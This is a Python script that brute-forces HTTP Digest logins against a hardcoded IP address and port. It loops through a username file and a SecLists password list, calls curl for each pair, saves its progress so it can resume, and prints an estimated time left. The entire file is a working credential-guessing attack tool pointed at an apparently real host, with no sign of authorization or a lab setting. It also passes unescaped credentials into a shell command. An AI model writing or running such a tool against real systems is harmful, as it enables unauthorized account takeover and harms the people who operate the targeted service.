import subprocess
import time
from tqdm import tqdm
import os

# Path to save progress
progress_file = 'progress.txt'

# Load wordlists
with open('user.txt') as f:
    usernames = f.read().splitlines()

with open('/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt') as f:
    passwords = f.read().splitlines()

# Target URL
url = "http://123.231.93.157:5400"

# Function to attempt login using curl with Digest Authentication
def attempt_login(username, password):
    # Construct the curl command
    command = f"curl -s -o /dev/null -w '%{{http_code}}' --digest -u {username}:{password} {url}"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    http_code = result.stdout.strip()
    
    if http_code == "200":
        print(f"Success! Username: {username}, Password: {password}")
        return True
    elif http_code == "403":
        print(f"Blocked! Username: {username}, Password: {password}")
    return False

# Function to save progress
def save_progress(username, password):
    with open(progress_file, 'w') as f:
        f.write(f"{username}\n{password}")

# Function to load progress
def load_progress():
    if os.path.exists(progress_file):
        with open(progress_file, 'r') as f:
            username = f.readline().strip()
            password = f.readline().strip()
            return username, password
    return None, None

# Load progress
start_username, start_password = load_progress()

# Total number of attempts
total_attempts = len(usernames) * len(passwords)

# Start time
start_time = time.time()

# Find starting indices
start_user_index = usernames.index(start_username) if start_username in usernames else 0
start_pass_index = passwords.index(start_password) if start_password in passwords else 0

# Iterate through each username and password combination with progress bar
with tqdm(total=total_attempts, desc="Brute-forcing", unit=" attempt") as pbar:
    for user_index in range(start_user_index, len(usernames)):
        for pass_index in range(start_pass_index if user_index == start_user_index else 0, len(passwords)):
            username = usernames[user_index]
            password = passwords[pass_index]
            if attempt_login(username, password):
                os.remove(progress_file)
                break
            # Save progress
            save_progress(username, password)
            # Update the progress bar
            pbar.update(1)
            
            # Calculate and display estimated time left
            elapsed_time = time.time() - start_time
            attempts_done = pbar.n
            avg_time_per_attempt = elapsed_time / attempts_done if attempts_done > 0 else 0
            remaining_attempts = total_attempts - attempts_done
            estimated_time_left = remaining_attempts * avg_time_per_attempt
            pbar.set_postfix_str(f"ETA: {estimated_time_left:.2f} sec")


